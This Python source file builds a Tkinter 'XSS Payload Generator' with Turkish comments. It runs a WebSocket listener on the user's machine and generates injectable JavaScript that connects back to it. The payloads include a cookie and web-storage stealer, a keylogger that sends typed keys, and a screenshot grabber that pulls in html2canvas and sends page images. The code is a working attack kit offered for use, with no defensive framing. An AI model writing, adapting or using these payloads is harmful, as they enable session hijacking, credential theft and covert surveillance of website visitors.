import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import socket
import asyncio
import websockets
import json
import requests
from datetime import datetime

class WebSocketServer:
    def __init__(self):
        self.server = None
        self.clients = set()
        self.running = False
        
    async def handle_client(self, websocket, path):
        self.clients.add(websocket)
        client_info = f"Yeni bağlantı: {websocket.remote_address}"
        print(client_info)
        
        try:
            async for message in websocket:
                data = json.loads(message)
                print(f"Mesaj alındı: {data}")
                
                # Tüm clientlara mesajı yayınla
                if self.clients:
                    await asyncio.gather(
                        *[client.send(json.dumps({
                            "type": "message",
                            "data": data,
                            "timestamp": datetime.now().isoformat()
                        })) for client in self.clients if client != websocket],
                        return_exceptions=True
                    )
        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            self.clients.remove(websocket)
            
    async def start_server(self, host, port):
        self.server = await websockets.serve(self.handle_client, host, port)
        self.running = True
        print(f"WebSocket sunucusu başlatıldı: {host}:{port}")
        
    def stop_server(self):
        if self.server:
            self.server.close()
            self.running = False

class IPDetectorGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("WebSocket Server & XSS Payload Generator")
        self.root.geometry("800x600")
        self.root.configure(bg='#2b2b2b')
        
        self.websocket_server = WebSocketServer()
        self.server_thread = None
        
        self.setup_gui()
        self.detect_ip()
        
    def setup_gui(self):
        # Ana frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # IP Bilgileri Frame
        ip_frame = ttk.LabelFrame(main_frame, text="IP Bilgileri", padding=10)
        ip_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(ip_frame, text="Yerel IP:").grid(row=0, column=0, sticky=tk.W)
        self.local_ip_var = tk.StringVar()
        ttk.Label(ip_frame, textvariable=self.local_ip_var, foreground="green").grid(row=0, column=1, sticky=tk.W, padx=(10, 0))
        
        ttk.Label(ip_frame, text="Dış IP:").grid(row=1, column=0, sticky=tk.W)
        self.external_ip_var = tk.StringVar()
        ttk.Label(ip_frame, textvariable=self.external_ip_var, foreground="blue").grid(row=1, column=1, sticky=tk.W, padx=(10, 0))
        
        # WebSocket Server Frame
        server_frame = ttk.LabelFrame(main_frame, text="WebSocket Sunucusu", padding=10)
        server_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(server_frame, text="Port:").grid(row=0, column=0, sticky=tk.W)
        self.port_var = tk.StringVar(value="3000")
        ttk.Entry(server_frame, textvariable=self.port_var, width=10).grid(row=0, column=1, sticky=tk.W, padx=(10, 0))
        
        self.start_button = ttk.Button(server_frame, text="Sunucuyu Başlat", command=self.start_server)
        self.start_button.grid(row=0, column=2, padx=(20, 0))
        
        self.stop_button = ttk.Button(server_frame, text="Sunucuyu Durdur", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=3, padx=(10, 0))
        
        self.status_var = tk.StringVar(value="Sunucu durumu: Kapalı")
        ttk.Label(server_frame, textvariable=self.status_var).grid(row=1, column=0, columnspan=4, sticky=tk.W, pady=(10, 0))
        
        # XSS Payload Frame
        xss_frame = ttk.LabelFrame(main_frame, text="XSS Payload Generator", padding=10)
        xss_frame.pack(fill=tk.BOTH, expand=True)
        
        # Payload seçenekleri
        payload_options_frame = ttk.Frame(xss_frame)
        payload_options_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(payload_options_frame, text="Payload Tipi:").pack(side=tk.LEFT)
        self.payload_type = tk.StringVar(value="basic")
        
        payload_types = [
            ("Temel WebSocket", "basic"),
            ("Cookie Çalma", "cookie"),
            ("Keylogger", "keylogger"),
            ("Ekran Görüntüsü", "screenshot")
        ]
        
        for text, value in payload_types:
            ttk.Radiobutton(payload_options_frame, text=text, variable=self.payload_type, 
                           value=value, command=self.generate_payload).pack(side=tk.LEFT, padx=(10, 0))
        
        # Payload text area
        self.payload_text = scrolledtext.ScrolledText(xss_frame, height=15, wrap=tk.WORD)
        self.payload_text.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Butonlar
        button_frame = ttk.Frame(xss_frame)
        button_frame.pack(fill=tk.X)
        
        ttk.Button(button_frame, text="Payload Oluştur", command=self.generate_payload).pack(side=tk.LEFT)
        ttk.Button(button_frame, text="Panoya Kopyala", command=self.copy_payload).pack(side=tk.LEFT, padx=(10, 0))
        
        # İlk payload'u oluştur
        self.generate_payload()
        
    def detect_ip(self):
        # Yerel IP tespit et
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            self.local_ip_var.set(local_ip)
        except:
            self.local_ip_var.set("Tespit edilemedi")
            
        # Dış IP tespit et (thread'de)
        threading.Thread(target=self.get_external_ip, daemon=True).start()
        
    def get_external_ip(self):
        try:
            response = requests.get("https://httpbin.org/ip", timeout=5)
            external_ip = response.json()["origin"]
            self.external_ip_var.set(external_ip)
        except:
            self.external_ip_var.set("Tespit edilemedi")
            
    def start_server(self):
        if not self.websocket_server.running:
            host = self.local_ip_var.get()
            port = int(self.port_var.get())
            
            def run_server():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self.websocket_server.start_server(host, port))
                loop.run_forever()
                
            self.server_thread = threading.Thread(target=run_server, daemon=True)
            self.server_thread.start()
            
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.status_var.set(f"Sunucu durumu: Çalışıyor ({host}:{port})")
            
    def stop_server(self):
        self.websocket_server.stop_server()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.status_var.set("Sunucu durumu: Kapalı")
        
    def generate_payload(self):
        host = self.local_ip_var.get()
        port = self.port_var.get()
        payload_type = self.payload_type.get()
        
        payloads = {
            "basic": f'''
// Temel WebSocket Bağlantısı
(function() {{
    const ws = new WebSocket('ws://{host}:{port}');
    
    ws.onopen = function() {{
        console.log('WebSocket bağlantısı açıldı');
        ws.send(JSON.stringify({{
            type: 'connection',
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        }}));
    }};
    
    ws.onmessage = function(event) {{
        console.log('Mesaj alındı:', event.data);
    }};
    
    ws.onerror = function(error) {{
        console.log('WebSocket hatası:', error);
    }};
}})();
''',
            "cookie": f'''
// Cookie Çalma Payload'u
(function() {{
    const ws = new WebSocket('ws://{host}:{port}');
    
    ws.onopen = function() {{
        ws.send(JSON.stringify({{
            type: 'cookies',
            url: window.location.href,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            timestamp: new Date().toISOString()
        }}));
    }};
}})();
''',
            "keylogger": f'''
// Keylogger Payload'u
(function() {{
    const ws = new WebSocket('ws://{host}:{port}');
    let keyBuffer = '';
    
    ws.onopen = function() {{
        console.log('Keylogger aktif');
    }};
    
    document.addEventListener('keypress', function(e) {{
        keyBuffer += e.key;
        
        if (keyBuffer.length > 50 || e.key === 'Enter') {{
            ws.send(JSON.stringify({{
                type: 'keylog',
                url: window.location.href,
                keys: keyBuffer,
                timestamp: new Date().toISOString()
            }}));
            keyBuffer = '';
        }}
    }});
}})();
''',
            "screenshot": f'''
// Ekran Görüntüsü Payload'u
(function() {{
    const ws = new WebSocket('ws://{host}:{port}');
    
    function takeScreenshot() {{
        html2canvas(document.body).then(canvas => {{
            const imageData = canvas.toDataURL();
            ws.send(JSON.stringify({{
                type: 'screenshot',
                url: window.location.href,
                image: imageData,
                timestamp: new Date().toISOString()
            }}));
        }});
    }}
    
    ws.onopen = function() {{
        // html2canvas kütüphanesini yükle
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        script.onload = takeScreenshot;
        document.head.appendChild(script);
    }};
}})();
'''
        }
        
        self.payload_text.delete(1.0, tk.END)
        self.payload_text.insert(1.0, payloads[payload_type])
        
    def copy_payload(self):
        payload = self.payload_text.get(1.0, tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(payload)
        messagebox.showinfo("Başarılı", "Payload panoya kopyalandı!")
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = IPDetectorGUI()
    app.run()